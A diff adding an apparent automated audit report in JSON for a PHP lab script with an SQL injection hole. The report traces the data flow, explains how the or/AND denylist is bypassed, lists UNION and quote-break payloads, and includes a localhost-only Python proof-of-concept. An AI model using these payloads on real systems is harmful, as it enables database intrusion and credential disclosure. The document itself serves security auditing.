@@ -1,0 +1,184 @@
+{
+  "schema_version": "wp2-output-v1",
+  "sample_id": "SQLI-003",
+  "input_version": "v2",
+  "prompt_version": "v2",
+  "analysis_stage": "parent",
+  "received_packet_ids": [
+    "SQLI-003"
+  ],
+  "prediction": "存在候选",
+  "verdict": "待验证",
+  "confidence": {
+    "level": "high",
+    "reason": "The whole source-to-sink chain is visible inside the normalized block: GET id at line 7, the only filter at lines 13 and 40-41, string interpolation at line 16 and execution at line 17, plus both observation channels at lines 19-24 and line 30. The denylist provably removes only the substrings or/AND and therefore cannot constrain quote characters, comments or UNION keywords. The missing include only supplies connection parameters per the audit description, and no escaping call appears inside the audited unit; the remaining uncertainty is limited to runtime configuration, not to the data flow."
+  },
+  "findings": [
+    {
+      "finding_id": "SQLI-003-F1",
+      "vulnerability_type": "SQL注入",
+      "locations": [
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 5,
+          "line_end": 5,
+          "quote": "if(isset($_GET['id']))"
+        },
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 7,
+          "line_end": 7,
+          "quote": "$id=$_GET['id'];"
+        },
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 9,
+          "line_end": 9,
+          "quote": "$fp=fopen('result.txt','a');"
+        },
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 13,
+          "line_end": 13,
+          "quote": "$id= blacklist($id);"
+        },
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 16,
+          "line_end": 16,
+          "quote": "$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";"
+        },
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 17,
+          "line_end": 17,
+          "quote": "$result=mysql_query($sql);"
+        },
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 22,
+          "line_end": 22,
+          "quote": "echo 'Your Login name:'. $row['username'];"
+        },
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 30,
+          "line_end": 30,
+          "quote": "print_r(mysql_error());"
+        },
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 40,
+          "line_end": 40,
+          "quote": "$id= preg_replace('/or/i',\"\", $id);"
+        },
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 41,
+          "line_end": 41,
+          "quote": "$id= preg_replace('/AND/i',\"\", $id);"
+        },
+        {
+          "fragment_id": "SQLI-003",
+          "line_start": 44,
+          "line_end": 44,
+          "quote": "echo \"Hint: Your Input is Filtered with following result: \".$hint;"
+        }
+      ],
+      "data_flow": [
+        "line 5: the top-level handler only runs when the GET parameter id is set.",
+        "line 7: $id=$_GET['id'] copies the raw request value with no type check, length check or character allowlist.",
+        "lines 9-11: the raw value is appended to result.txt for logging; this is a side copy, not a sanitizer.",
+        "line 13: blacklist() runs on $id, and lines 40-41 show it only deletes every case-insensitive occurrence of the substrings 'or' and 'AND'.",
+        "line 14: $hint keeps the filtered value; line 44 later echoes it back.",
+        "line 16: the filtered value is interpolated inside a single-quoted SQL string literal, after id=' and before ' LIMIT 0,1.",
+        "line 17: mysql_query() sends the assembled statement to the server without a prepared statement, placeholder binding or charset-aware escaping.",
+        "lines 19-24: when a row is returned, username and password columns are printed, giving a boolean/union observation channel.",
+        "line 30: when no row is returned, mysql_error() is printed, giving an error-based observation channel.",
+        "bypass: the denylist deletes only the substrings or/AND, so a payload with no such substring (for example a UNION SELECT with a comment terminator) keeps quote, keyword and comment syntax intact."
+      ],
+      "principle": "The GET parameter id is interpolated verbatim into the single-quoted literal of SELECT * FROM users WHERE id='$id' LIMIT 0,1 and executed with mysql_query(). The only filter between source and sink (blacklist, lines 40-41) removes the substrings 'or' and 'AND' but leaves single quotes, whitespace, comment markers, UNION, SELECT, ORDER BY, IF and other SQL tokens untouched, so the denylist does not constrain the value that actually reaches the query. A payload without the banned substrings breaks out of the literal and rewrites the query structure; the rendered username/password and the printed mysql_error() provide boolean, UNION and error observation channels.",
+      "impact": "Unauthenticated read access to rows returned by the rewritten query in the connected database (the code path renders the users table's username and password columns), i.e. disclosure of credential material from the lab database; query semantics can also be bent to bypass the intended single-row id lookup. No write, file or stacked-query capability is claimed from this code.",
+      "preconditions": [
+        "Attacker can reach the top-level handler with GET id set (line 5) over the deployed HTTP path.",
+        "A payload contains no case-insensitive 'or' or 'and' substring so it survives blacklist() (lines 40-41); e.g. 1' UNION SELECT 1,2,3-- - or 1'||'1.",
+        "The legacy mysql_* API is available at runtime (PHP with the mysql extension) and the include at line 3 establishes a working connection to the security database.",
+        "The query is built by string interpolation as shown at line 16, with no escaping call between lines 13 and 17.",
+        "For the UNION variant, the users table exposes three selectable columns so that the marker tuple maps onto the rendered username/password fields; the exact column count must be confirmed manually.",
+        "For error-based observation, display_errors/PHP error output must be on so line 30 actually prints mysql_error()."
+      ],
+      "counterexamples": [
+        "Prepared statements or parameter binding would make the value a bound parameter, but no mysqli/PDO usage exists in the audited unit.",
+        "A filter that rejected or escaped single quotes, comment markers, UNION/SELECT keywords or whitespace would block the string-based vectors; the shown blacklist does none of these.",
+        "mysql_real_escape_string()/addslashes() applied after line 13 and before line 16 would stop the quote breakout; it is absent.",
+        "If magic_quotes_gpc were active on a legacy PHP build, request quotes could arrive backslash-escaped and this specific quote-break vector would not fire; the PHP version and that setting are not in the audit data (note magic_quotes was removed in PHP 5.4+).",
+        "If the mysql extension is missing (PHP 7+), the script dies at line 17 with an interface fatal error instead of executing the query; that failure mode must not be read as SQL injection being disproved.",
+        "A WAF or reverse proxy in front of the deployment could rewrite or block the payload; no such component is described in the audit data."
+      ],
+      "poc": {
+        "status": "需人工适配",
+        "language": "python",
+        "code": "#!/usr/bin/env python3\n\"\"\"Local-only SQL injection verification draft for sample SQLI-003.\n\nTargets the audited PHP entry point (GET parameter \"id\" concatenated into\n\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\"). Uses numeric marker columns\nonly: it does not enumerate databases, dump rows or change any record.\nRequires explicit --path because the deployment path of the audited file is\nnot part of the audit data.\n\"\"\"\nimport argparse\nimport json\nimport sys\nimport urllib.error\nimport urllib.parse\nimport urllib.request\n\nALLOWED_HOSTS = {\"127.0.0.1\", \"localhost\", \"::1\"}\n\n\ndef assert_local(url):\n    parts = urllib.parse.urlsplit(url)\n    if parts.scheme not in (\"http\", \"https\"):\n        raise SystemExit(\"refuse: scheme must be http or https\")\n    if parts.hostname not in ALLOWED_HOSTS:\n        raise SystemExit(\"refuse: %r is not an explicitly authorized local host\" % (parts.hostname,))\n\n\nclass NoRedirect(urllib.request.HTTPRedirectHandler):\n    def redirect_request(self, req, fp, code, msg, headers, newurl):\n        return None  # surface 3xx instead of following it\n\n\ndef request(base_url, path, param, value, timeout, headers):\n    url = base_url.rstrip(\"/\") + path + \"?\" + urllib.parse.urlencode({param: value})\n    assert_local(url)\n    opener = urllib.request.build_opener(NoRedirect)\n    req = urllib.request.Request(url, headers=headers)\n    try:\n        with opener.open(req, timeout=timeout) as resp:\n            return {\"kind\": \"http\", \"status\": resp.status,\n                    \"location\": resp.headers.get(\"Location\"),\n                    \"body\": resp.read().decode(\"utf-8\", \"replace\")}\n    except urllib.error.HTTPError as exc:\n        return {\"kind\": \"http\", \"status\": exc.code,\n                \"location\": exc.headers.get(\"Location\") if exc.headers else None,\n                \"body\": exc.read().decode(\"utf-8\", \"replace\")}\n    except urllib.error.URLError as exc:\n        return {\"kind\": \"connect_error\", \"error\": str(exc.reason)}\n    except TimeoutError:\n        return {\"kind\": \"timeout\"}\n\n\nMARKERS = (\"Your Login name:\", \"Your Password:\",\n           \"Hint: Your Input is Filtered\",\n           \"Please input the ID\", \"You have an error in your SQL syntax\")\n\n\ndef summarize(label, res):\n    if res[\"kind\"] != \"http\":\n        print(\"[%s] transport=%s detail=%s\" % (label, res[\"kind\"], json.dumps(res, ensure_ascii=False)))\n        return\n    print(\"[%s] status=%s location=%r bytes=%d\"\n          % (label, res[\"status\"], res[\"location\"], len(res[\"body\"])))\n    for marker in MARKERS:\n        if marker in res[\"body\"]:\n            print(\"    marker present: %s\" % marker)\n\n\ndef main():\n    ap = argparse.ArgumentParser(description=\"SQLI-003 local HTTP verification draft (manual adaptation expected)\")\n    ap.add_argument(\"--base-url\", default=\"http://127.0.0.1:8080\", help=\"local lab base URL\")\n    ap.add_argument(\"--path\", required=True, help=\"path of the audited PHP script, e.g. /lab/sqli-003.php\")\n    ap.add_argument(\"--param\", default=\"id\", help=\"parameter name taken from the audited code (GET id)\")\n    ap.add_argument(\"--timeout\", type=float, default=8.0)\n    ap.add_argument(\"--session-file\", default=\"\", help=\"optional file whose first line is a Cookie header value\")\n    ap.add_argument(\"--cookie-header\", default=\"\", help=\"optional Cookie header value passed directly\")\n    args = ap.parse_args()\n\n    cookie = args.cookie_header\n    if args.session_file:\n        with open(args.session_file, \"r\", encoding=\"utf-8\") as fh:\n            cookie = fh.readline().strip()\n    headers = {\"User-Agent\": \"sqli003-local-draft/1.0\"}\n    if cookie:\n        headers[\"Cookie\"] = cookie  # never printed\n\n    baseline = request(args.base_url, args.path, args.param, \"1\", args.timeout, headers)\n    empty = request(args.base_url, args.path, args.param, \"999999\", args.timeout, headers)\n    quote = request(args.base_url, args.path, args.param, \"1'\", args.timeout, headers)\n    union = request(args.base_url, args.path, args.param,\n                    \"1' UNION SELECT 1,2,3-- -\", args.timeout, headers)\n\n    summarize(\"baseline id=1\", baseline)\n    summarize(\"control  id=999999\", empty)\n    summarize(\"control  id=1'\", quote)\n    summarize(\"test     union marker\", union)\n\n    if union[\"kind\"] == \"http\" and \"Your Login name:2\" in union[\"body\"]:\n        print(\"observation: marker column 2 rendered in the username slot\")\n    if union[\"kind\"] == \"http\" and \"Your Password:3\" in union[\"body\"]:\n        print(\"observation: marker column 3 rendered in the password slot\")\n    print(\"compare the four responses; the script reports observations only, not a verified verdict\")\n\n\nif __name__ == \"__main__\":\n    main()\n",
+        "artifact_path": null,
+        "dependencies": [
+          "Python 3.8+",
+          "standard library only (argparse, json, urllib)"
+        ],
+        "parameters": [
+          "--base-url (default http://127.0.0.1:8080; host must be localhost/127.0.0.1/::1)",
+          "--path (required; the deployed path of the audited PHP script is not given by the audit data)",
+          "--param (default id, the parameter name read at line 7)",
+          "--timeout (default 8s)",
+          "--session-file or --cookie-header (optional; only needed if the lab requires an existing session)"
+        ],
+        "steps": [
+          "Start the local lab and confirm the audited script is reachable at --path with a harmless numeric id.",
+          "Run: python sqli003_poc.py --base-url http://127.0.0.1:<port> --path <audited-path> --param id",
+          "Inspect the baseline id=1 response: it should show 'Your Login name:' and 'Your Password:' for the seeded row.",
+          "Compare with the id=999999 control: normally no row, so the branch at line 30 prints a mysql_error() hint.",
+          "Compare with the id=1' control: an unescaped-quote syntax error indicates the value reaches the query unmodified (do not treat any PHP fatal error as this signal).",
+          "Run the marker request 1' UNION SELECT 1,2,3-- -: marker values 2 and 3 appearing in the username/password slots, or a structurally different result set, show the query was rewritten.",
+          "Record both responses, HTTP status, and whether the request was redirected to a login page; the script prints observations only."
+        ],
+        "expected_observation": "baseline id=1 returns 200 with the seeded username/password; id=999999 returns 200 with empty/error text; id=1' returns a SQL syntax error near the extra quote, proving the quote is not escaped; the UNION marker request returns 200 with the numeric markers 2 and 3 rendered where the username/password were rendered for id=1, instead of the seeded row.",
+        "success_criteria": "The UNION marker is reflected in the username/password output slots of the same handler, combined with the unescaped-quote syntax error for id=1' and the unchanged behaviour of the id=1 baseline. If the id=1' control shows no SQL error, or if marker 2/3 do not appear while the response is a normal page, the observation is inconclusive; a login redirect, a PHP interface fatal error (mysql_* missing) or a connection error must be classified as environment/auth failure rather than as proof either way. This draft asserts no trigger until the responses are recorded.",
+        "limitations": [
+          "The HTTP path, port and any authentication of the deployment are unknown, so --path must be supplied by the operator (manual adaptation).",
+          "The marker payload assumes three columns because the code prints username and password; the real users table schema is not provided, so the tuple may need adjustment.",
+          "Only a local authorized lab may be targeted; the script refuses non-local hosts and does not follow redirects.",
+          "No statement about write, file or stacked-query impact is made or tested."
+        ],
+        "execution_status": "未运行"
+      }
+    }
+  ],
+  "exclusion_evidence": [],
+  "missing_context": [
+    "context/sqli-connect.php content: connection API, character set (set names / charset in DSN) and any escaping or quoting mode.",
+    "Which line of sql-connect.php selects the security database and whether error reporting is enabled.",
+    "users table schema (column count) and seed data for the id used in the baseline request.",
+    "Deployed HTTP path, port and vhost of the audited script, plus any WAF or reverse proxy in front of it.",
+    "PHP version and whether the legacy mysql extension is present; also magic_quotes_gpc-equivalent legacy settings and display_errors.",
+    "Database engine version and sql_mode, which affect comment syntax and error text.",
+    "Whether the lab requires an authenticated session before this handler can be reached."
+  ],
+  "risk_notes": [
+    "Line 10 writes the raw, unfiltered id value into result.txt with append mode: log injection / log growth, and the file accumulates attacker-controlled text.",
+    "Line 44 echoes the filtered input back into the HTML page unescaped, a reflected-content (XSS) risk outside the SQL injection scope.",
+    "Line 30 prints mysql_error() to the response, an information-disclosure issue that also supports error-based injection.",
+    "Lines 22-24 render the users table password column in clear text to the client."
+  ],
+  "quality_notes": [
+    "mysql_* functions are removed in PHP 7+; the code needs a legacy runtime or a port to mysqli/PDO.",
+    "The blacklist deletes 'or'/'and' anywhere in the value, corrupting legitimate input such as 'order' or 'android' and hinting at a denylist that is both over- and under-inclusive.",
+    "No input validation, no explicit row/field allowlist, and no separation between the query template and its value.",
+    "No error handling around mysql_query(); a failed connection surfaces as a PHP error rather than a controlled response."
+  ],
+  "limitations": [
+    "Static review only; no HTTP request was sent, so verdict stays 待验证 and confidence is not a probability of exploitability.",
+    "The connection include is not part of the audited block; charset-aware escaping or connection-level settings could not be inspected.",
+    "The exact HTTP path, users table column count and runtime PHP/MySQL versions are unknown, so the POC is marked 需人工适配.",
+    "The marker payload deliberately avoids 'or'/'and'; other bypasses (boolean, time-based, stacked queries) were not enumerated."
+  ],
+  "runtime_evidence": []
+}
